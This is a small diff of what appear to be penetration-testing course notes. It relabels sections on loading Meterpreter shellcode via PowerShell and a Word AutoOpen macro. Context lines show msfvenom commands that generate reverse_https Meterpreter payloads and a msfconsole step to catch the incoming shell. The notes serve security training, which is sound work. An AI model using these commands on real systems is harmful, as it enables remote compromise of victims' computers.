@@ -16,7 +16,7 @@ First, generate the shellcode using msfvenom:
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1
 ```
 
-Then put it into the Powershell code below:
+Then put it into the Powershell code below for **64-bit**:
 
 ```powershell
 $Shell32 = @"
@@ -50,7 +50,7 @@ Note:
 * Can remove all the `[return: MarshalAs(...)]`
 * Sometimes the DLL might not be correct, refer back to MSDN for the final confirmation
 
-Official Solution from Offsec (using `msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`):
+Official Solution from Offsec for **32-bit** (using `msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`):
 
 ```powershell
 $Kernel32 = @"
@@ -94,7 +94,7 @@ Sub AutoOpen()
 End Sub
 ```
 
-Finally prepare for incoming shell:
+Finally prepare for incoming shell **(remember to change to 32-bit if required)**:
 
 ```
 msfconsole -q
